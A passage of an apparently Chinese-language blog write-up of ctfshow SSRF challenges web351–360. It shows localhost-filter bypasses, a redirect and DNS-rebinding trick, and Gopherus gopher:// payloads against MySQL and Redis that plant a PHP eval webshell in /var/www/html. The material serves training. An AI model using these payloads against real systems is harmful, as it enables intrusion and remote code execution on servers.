class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);<span class="comment">#关闭一个curl会话</span></span><br><span class="line"><span class="keyword">echo</span> (<span class="variable">$result</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>先访问下index.php文件试试</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203281824803.png" alt="image-20220328182412744"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203281824548.png" alt="image-20220328182419504"></p><p>扫了下目录</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203281824839.png" alt="image-20220328182457772"></p><p>也可以使用file协议读取文件,但是怎么得到网站路径呢(我不会)</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203281840211.png" alt="image-20220328184035147"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">url=http://0/flag.php</span><br><span class="line">url=http://0.0.0.0/flag.php</span><br><span class="line">url=http://127.1/flag.php</span><br><span class="line">url=http://2130706433/flag.php</span><br><span class="line">url=http://017700000001/flag.php</span><br><span class="line">url=http://0b1111111000000000000000000000001/flag.php 不行</span><br><span class="line">url=http://0x7f.0.0.1/flag.php</span><br><span class="line">url=http://0177.0.0.1/flag.php</span><br><span class="line">url=http://localhost/flag.php</span><br><span class="line">url=http://127.127.127.127/flag.php</span><br></pre></td></tr></table></figure><h1 id="web352"><a href="#web352" class="headerlink" title="web352"></a>web352</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$url</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="variable">$x</span>=<span class="title function_ invoke__">parse_url</span>(<span class="variable">$url</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$x</span>[<span class="string">&#x27;scheme&#x27;</span>]===<span class="string">&#x27;http&#x27;</span>||<span class="variable">$x</span>[<span class="string">&#x27;scheme&#x27;</span>]===<span class="string">&#x27;https&#x27;</span>)&#123;<span class="comment">#如果scheme是http或者scheme</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/localhost|127.0.0/&#x27;</span>))&#123;<span class="comment">#如果没有匹配到localhost或者127.0.0.1</span></span><br><span class="line"><span class="variable">$ch</span>=<span class="title function_ invoke__">curl_init</span>(<span class="variable">$url</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line"><span class="variable">$result</span>=<span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);</span><br><span class="line"><span class="keyword">echo</span> (<span class="variable">$result</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> hacker</span><br></pre></td></tr></table></figure><p>parse_url函数返回</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Array (</span><br><span class="line">[scheme] =&gt; http</span><br><span class="line">[host] =&gt; hostname</span><br><span class="line">[user] =&gt; username</span><br><span class="line">[pass] =&gt; password</span><br><span class="line">[path] =&gt; /path</span><br><span class="line">[query] =&gt; arg=value</span><br><span class="line">[fragment] =&gt; anchor</span><br><span class="line">)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">url=http://0/flag.php</span><br><span class="line">url=http://0.0.0.0/flag.php</span><br><span class="line">url=http://127.1/flag.php</span><br><span class="line">url=http://2130706433/flag.php</span><br><span class="line">url=http://017700000001/flag.php</span><br><span class="line">url=http://0b1111111000000000000000000000001/flag.php 不行</span><br><span class="line">url=http://0x7f.0.0.1/flag.php</span><br><span class="line">url=http://0177.0.0.1/flag.php</span><br><span class="line">url=http://localhost/flag.php</span><br><span class="line">url=http://127.127.127.127/flag.php</span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203311644395.png" alt="image-20220331164446314"></p><h1 id="web353"><a href="#web353" class="headerlink" title="web353"></a>web353</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$url</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="variable">$x</span>=<span class="title function_ invoke__">parse_url</span>(<span class="variable">$url</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$x</span>[<span class="string">&#x27;scheme&#x27;</span>]===<span class="string">&#x27;http&#x27;</span>||<span class="variable">$x</span>[<span class="string">&#x27;scheme&#x27;</span>]===<span class="string">&#x27;https&#x27;</span>)&#123;</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/localhost|127\.0\.|\。/i&#x27;</span>, <span class="variable">$url</span>))&#123;</span><br><span class="line"><span class="variable">$ch</span>=<span class="title function_ invoke__">curl_init</span>(<span class="variable">$url</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line"><span class="variable">$result</span>=<span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);</span><br><span class="line"><span class="keyword">echo</span> (<span class="variable">$result</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> hacker</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">url=http://0/flag.php</span><br><span class="line">url=http://0.0.0.0/flag.php</span><br><span class="line">url=http://127.1/flag.php</span><br><span class="line">url=http://2130706433/flag.php</span><br><span class="line">url=http://017700000001/flag.php</span><br><span class="line">url=http://0b1111111000000000000000000000001/flag.php 不行</span><br><span class="line">url=http://0x7f.0.0.1/flag.php</span><br><span class="line">url=http://0177.0.0.1/flag.php</span><br><span class="line">url=http://localhost/flag.php不行</span><br><span class="line">url=http://127.127.127.127/flag.php</span><br></pre></td></tr></table></figure><h1 id="web354"><a href="#web354" class="headerlink" title="web354"></a>web354</h1><h2 id="302跳转"><a href="#302跳转" class="headerlink" title="302跳转"></a>302跳转</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$url</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="variable">$x</span>=<span class="title function_ invoke__">parse_url</span>(<span class="variable">$url</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$x</span>[<span class="string">&#x27;scheme&#x27;</span>]===<span class="string">&#x27;http&#x27;</span>||<span class="variable">$x</span>[<span class="string">&#x27;scheme&#x27;</span>]===<span class="string">&#x27;https&#x27;</span>)&#123;</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/localhost|1|0|。/i&#x27;</span>, <span class="variable">$url</span>))&#123;</span><br><span class="line"><span class="variable">$ch</span>=<span class="title function_ invoke__">curl_init</span>(<span class="variable">$url</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line"><span class="variable">$result</span>=<span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);</span><br><span class="line"><span class="keyword">echo</span> (<span class="variable">$result</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> hacker</span><br></pre></td></tr></table></figure><p>ssrf.php</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php header(&quot;Location: http://127.0.0.1/flag.php&quot;);</span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409213546208.png" alt="image-20220409213546208"></p><p>访问这个文件就跳转,不过我没有公网ip</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409215541568.png" alt="image-20220409215541568"></p><p>注册-&gt;添加dns rebinding-&gt;复制identifier-&gt;前面加个r</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409215639292.png" alt="image-20220409215639292"></p><p>现成的A记录是127.0.0.1的网站</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">url=http://sudo.cc/flag.php</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">自己的域名A记录设为了127.0.0.1</span><br></pre></td></tr></table></figure><p>替换一下localhost</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;Expectedsolution.txt&#x27;</span>,<span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">128</span>,<span class="number">65537</span>):    </span><br><span class="line">        tmp=<span class="built_in">chr</span>(i)    </span><br><span class="line">        <span class="keyword">try</span>:        </span><br><span class="line">            res = tmp.encode(<span class="string">&#x27;idna&#x27;</span>).decode(<span class="string">&#x27;utf-8&#x27;</span>)        </span><br><span class="line">            <span class="keyword">if</span>(<span class="string">&quot;-&quot;</span>) <span class="keyword">in</span> res:            </span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            f.write(<span class="string">&quot;U:&#123;&#125;    A:&#123;&#125;      ascii:&#123;&#125; &quot;</span>.<span class="built_in">format</span>(tmp, res, i) + <span class="string">&#x27;\n&#x27;</span>)       </span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;U:&#123;&#125;    A:&#123;&#125;      ascii:&#123;&#125; &quot;</span>.<span class="built_in">format</span>(tmp, res, i))    </span><br><span class="line">        <span class="keyword">except</span>:        </span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">f.close()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>替换字符a为£Á：即loc£Álhost</p><h1 id="web355"><a href="#web355" class="headerlink" title="web355"></a>web355</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$url</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="variable">$x</span>=<span class="title function_ invoke__">parse_url</span>(<span class="variable">$url</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$x</span>[<span class="string">&#x27;scheme&#x27;</span>]===<span class="string">&#x27;http&#x27;</span>||<span class="variable">$x</span>[<span class="string">&#x27;scheme&#x27;</span>]===<span class="string">&#x27;https&#x27;</span>)&#123;</span><br><span class="line"><span class="variable">$host</span>=<span class="variable">$x</span>[<span class="string">&#x27;host&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>((<span class="title function_ invoke__">strlen</span>(<span class="variable">$host</span>)&lt;=<span class="number">5</span>))&#123;</span><br><span class="line"><span class="variable">$ch</span>=<span class="title function_ invoke__">curl_init</span>(<span class="variable">$url</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line"><span class="variable">$result</span>=<span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);</span><br><span class="line"><span class="keyword">echo</span> (<span class="variable">$result</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> hacker</span><br></pre></td></tr></table></figure><p>设置了$host&lt;5的限制，随便来个利用127.0.0.1&#x3D;127.1刚好是5位</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">url=http://0/flag.php</span><br><span class="line">url=http://127.1/flag.php</span><br></pre></td></tr></table></figure><h1 id="web356"><a href="#web356" class="headerlink" title="web356"></a>web356</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$url</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="variable">$x</span>=<span class="title function_ invoke__">parse_url</span>(<span class="variable">$url</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$x</span>[<span class="string">&#x27;scheme&#x27;</span>]===<span class="string">&#x27;http&#x27;</span>||<span class="variable">$x</span>[<span class="string">&#x27;scheme&#x27;</span>]===<span class="string">&#x27;https&#x27;</span>)&#123;</span><br><span class="line"><span class="variable">$host</span>=<span class="variable">$x</span>[<span class="string">&#x27;host&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>((<span class="title function_ invoke__">strlen</span>(<span class="variable">$host</span>)&lt;=<span class="number">3</span>))&#123;</span><br><span class="line"><span class="variable">$ch</span>=<span class="title function_ invoke__">curl_init</span>(<span class="variable">$url</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line"><span class="variable">$result</span>=<span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);</span><br><span class="line"><span class="keyword">echo</span> (<span class="variable">$result</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> hacker</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">url=http://0/flag.php</span><br></pre></td></tr></table></figure><h1 id="web357"><a href="#web357" class="headerlink" title="web357"></a>web357</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$url</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="variable">$x</span>=<span class="title function_ invoke__">parse_url</span>(<span class="variable">$url</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$x</span>[<span class="string">&#x27;scheme&#x27;</span>]===<span class="string">&#x27;http&#x27;</span>||<span class="variable">$x</span>[<span class="string">&#x27;scheme&#x27;</span>]===<span class="string">&#x27;https&#x27;</span>)&#123;</span><br><span class="line"><span class="variable">$ip</span> = <span class="title function_ invoke__">gethostbyname</span>(<span class="variable">$x</span>[<span class="string">&#x27;host&#x27;</span>]);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;/br&gt;&#x27;</span>.<span class="variable">$ip</span>.<span class="string">&#x27;&lt;/br&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">filter_var</span>(<span class="variable">$ip</span>, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE)) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;ip!&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;scheme&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> scheme</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">FILTER_FLAG_IPV4 - 要求值是合法的 IPv4 IP（比如 255.255.255.255）</span><br><span class="line">FILTER_FLAG_IPV6 - 要求值是合法的 IPv6 IP（比如 2001:0db8:85a3:08d3:1319:8a2e:0370:7334）</span><br><span class="line">FILTER_FLAG_NO_PRIV_RANGE - 要求值是 RFC 指定的私域 IP （比如 192.168.0.1）</span><br><span class="line">FILTER_FLAG_NO_RES_RANGE - 要求值不在保留的 IP 范围内。该标志接受 IPV4 和 IPV6 值</span><br></pre></td></tr></table></figure><p>不能有私有地址</p><h1 id="web358"><a href="#web358" class="headerlink" title="web358"></a>web358</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$url</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="variable">$x</span>=<span class="title function_ invoke__">parse_url</span>(<span class="variable">$url</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^http:\/\/ctf\..*show$/i&#x27;</span>,<span class="variable">$url</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$url</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">url=http://ctf.@127.0.0.1/flag.php?.show</span><br></pre></td></tr></table></figure><h1 id="web359"><a href="#web359" class="headerlink" title="web359"></a>web359</h1><h2 id="ssrf打无密码mysql-gopherus工具"><a href="#ssrf打无密码mysql-gopherus工具" class="headerlink" title="ssrf打无密码mysql gopherus工具"></a>ssrf打无密码mysql gopherus工具</h2><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409231917551.png" alt="image-20220409231917551"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409232024479.png" alt="image-20220409232024479"></p><p>发现访问了这个地址<a href="https://github.com/tarunkant/Gopherus">Gopherus</a></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gopherus --exploit mysql</span><br><span class="line">root   </span><br><span class="line">select &quot;&lt;?php eval($_POST[&#x27;zf&#x27;]);?&gt;&quot; INTO OUTFILE &#x27;/var/www/html/zf.php&#x27;</span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220410141657582.png" alt="image-20220410141657582"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220410141702883.png" alt="image-20220410141702883"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gopher://127.0.0.1:3306/_%a3%00%00%01%85%a6%ff%01%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%72%6f%6f%74%00%00%6d%79%73%71%6c%5f%6e%61%74%69%76%65%5f%70%61%73%73%77%6f%72%64%00%66%03%5f%6f%73%05%4c%69%6e%75%78%0c%5f%63%6c%69%65%6e%74%5f%6e%61%6d%65%08%6c%69%62%6d%79%73%71%6c%04%5f%70%69%64%05%32%37%32%35%35%0f%5f%63%6c%69%65%6e%74%5f%76%65%72%73%69%6f%6e%06%35%2e%37%2e%32%32%09%5f%70%6c%61%74%66%6f%72%6d%06%78%38%36%5f%36%34%0c%70%72%6f%67%72%61%6d%5f%6e%61%6d%65%05%6d%79%73%71%6c%49%00%00%00%03%73%65%6c%65%63%74%20%22%3c%3f%70%68%70%20%65%76%61%6c%28%24%5f%50%4f%53%54%5b%27%7a%66%27%5d%29%3b%3f%3e%22%20%49%4e%54%4f%20%4f%55%54%46%49%4c%45%20%27%2f%76%61%72%2f%77%77%77%2f%68%74%6d%6c%2f%7a%66%2e%70%68%70%27%01%00%00%00%01</span><br></pre></td></tr></table></figure><p>在3306&#x2F;_后面的一串字符串需要再进行一次url关键字符编码才可以使用</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220410141733071.png" alt="image-20220410141733071"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">u=1&amp;returl=gopher://127.0.0.1:3306/_%25a3%2500%2500%2501%2585%25a6%25ff%2501%2500%2500%2500%2501%2521%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2572%256f%256f%2574%2500%2500%256d%2579%2573%2571%256c%255f%256e%2561%2574%2569%2576%2565%255f%2570%2561%2573%2573%2577%256f%2572%2564%2500%2566%2503%255f%256f%2573%2505%254c%2569%256e%2575%2578%250c%255f%2563%256c%2569%2565%256e%2574%255f%256e%2561%256d%2565%2508%256c%2569%2562%256d%2579%2573%2571%256c%2504%255f%2570%2569%2564%2505%2532%2537%2532%2535%2535%250f%255f%2563%256c%2569%2565%256e%2574%255f%2576%2565%2572%2573%2569%256f%256e%2506%2535%252e%2537%252e%2532%2532%2509%255f%2570%256c%2561%2574%2566%256f%2572%256d%2506%2578%2538%2536%255f%2536%2534%250c%2570%2572%256f%2567%2572%2561%256d%255f%256e%2561%256d%2565%2505%256d%2579%2573%2571%256c%2549%2500%2500%2500%2503%2573%2565%256c%2565%2563%2574%2520%2522%253c%253f%2570%2568%2570%2520%2565%2576%2561%256c%2528%2524%255f%2550%254f%2553%2554%255b%2527%257a%2566%2527%255d%2529%253b%253f%253e%2522%2520%2549%254e%2554%254f%2520%254f%2555%2554%2546%2549%254c%2545%2520%2527%252f%2576%2561%2572%252f%2577%2577%2577%252f%2568%2574%256d%256c%252f%257a%2566%252e%2570%2568%2570%2527%2501%2500%2500%2500%2501</span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220410141757662.png" alt="image-20220410141757662"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220410141806054.png" alt="image-20220410141806054"></p><h1 id="web360"><a href="#web360" class="headerlink" title="web360"></a>web360</h1><h2 id="ssrf打无密码redis-gopherus工具"><a href="#ssrf打无密码redis-gopherus工具" class="headerlink" title="ssrf打无密码redis gopherus工具"></a>ssrf打无密码redis gopherus工具</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$url</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="variable">$ch</span>=<span class="title function_ invoke__">curl_init</span>(<span class="variable">$url</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line"><span class="variable">$result</span>=<span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);</span><br><span class="line"><span class="keyword">echo</span> (<span class="variable">$result</span>);</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gopherus --exploit redis</span><br><span class="line">php</span><br><span class="line"></span><br><span class="line">&lt;?php eval($_POST[&#x27;zf&#x27;]);?&gt;</span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220410144704672.png" alt="image-20220410144704672"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2431%0D%0A%0A%0A%3C%3Fphp%20eval%28%24_POST%5B%27zf%27%5D%29%3B%3F%3E%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2413%0D%0A/var/www/html%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%249%0D%0Ashell.php%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A%0A</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">url=gopher://127.0.0.1:6379/_%252A1%250D%250A%25248%250D%250Aflushall%250D%250A%252A3%250D%250A%25243%250D%250Aset%250D%250A%25241%250D%250A1%250D%250A%252431%250D%250A%250A%250A%253C%253Fphp%2520eval%2528%2524_POST%255B%2527zf%2527%255D%2529%253B%253F%253E%250A%250A%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%25243%250D%250Adir%250D%250A%252413%250D%250A%2Fvar%2Fwww%2Fhtml%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%252410%250D%250Adbfilename%250D%250A%25249%250D%250Ashell.php%250D%250A%252A1%250D%250A%25244%250D%250Asave%250D%250A%250A</span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220410144756321.png" alt="image-20220410144756321"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220410144816907.png" alt="image-20220410144816907"></p>]]></content>
      
      
      <categories>
          
          <category> ctfshow </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf.show </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sql</title>
      <link href="/ctfshow/ctf.show/sql/"/>
      <url>/ctfshow/ctf.show/sql/</url>
      
